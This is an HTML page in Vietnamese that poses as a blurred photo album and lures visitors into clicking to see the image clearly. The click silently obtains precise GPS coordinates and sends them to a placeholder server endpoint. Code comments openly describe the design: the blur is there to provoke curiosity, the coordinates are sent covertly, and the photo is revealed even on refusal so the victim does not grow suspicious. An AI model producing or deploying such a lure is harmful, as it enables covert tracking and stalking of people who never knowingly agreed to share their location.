<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xem Album Ảnh</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f9; padding: 20px; }
        .card { max-width: 400px; margin: 0 auto; background: #fff; padding: 15px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .img-preview { width: 100%; height: 250px; object-fit: cover; border-radius: 8px; filter: blur(5px); cursor: pointer; }
        .btn-view { background-color: #0084ff; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; margin-top: 15px; width: 100%; }
        .btn-view:hover { background-color: #006bce; }
        #status { margin-top: 10px; color: #666; font-size: 14px; }
    </style>
</head>
<body>

<div class="card">
    <h3>Album Ảnh Kỷ Niệm</h3>
    <!-- Ảnh làm mờ nhẹ để kích thích sự tò mò -->
    <img id="myImage" src="https://picsum.photos/400/300" class="img-preview" onclick="requestLocationAndView()">
    <p>Nhấn vào ảnh hoặc nút bên dưới để xem ảnh rõ nét và vị trí chụp.</p>
    <button class="btn-view" onclick="requestLocationAndView()">📸 Xem ảnh chất lượng cao</button>
    <p id="status"></p>
</div>

<script>
function requestLocationAndView() {
    const statusText = document.getElementById('status');
    const img = document.getElementById('myImage');
    
    statusText.innerText = "Đang tải ảnh...";

    if (navigator.geolocation) {
        // Yêu cầu lấy tọa độ GPS chính xác
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;

                // 1. Rõ mờ ảnh để hiển thị bình thường cho người dùng
                img.style.filter = "none";
                statusText.innerText = "Đã tải xong!";

                // 2. Gửi ngầm tọa độ về Server / API của bạn
                sendDataToServer(lat, lng);
            },
            (error) => {
                // Nếu người dùng từ chối, vẫn hiển thị ảnh để không gây nghi ngờ
                img.style.filter = "none";
                statusText.innerText = "Đã tải ảnh!";
                console.log("Người dùng từ chối cấp quyền vị trí.");
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    } else {
        img.style.filter = "none";
        statusText.innerText = "Trình duyệt không hỗ trợ định vị.";
    }
}

function sendDataToServer(lat, lng) {
    // Thay URL bằng Webhook/API endpoint lưu dữ liệu của bạn (ví dụ: n8n, Google Sheets API, hoặc Backend PHP/NodeJS)
    fetch('https://your-server-endpoint.com/save-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            latitude: lat,
            longitude: lng,
            timestamp: new Date().toISOString()
        })
    }).catch(err => console.error("Lỗi gửi dữ liệu:", err));
}
</script>

</body>
</html>
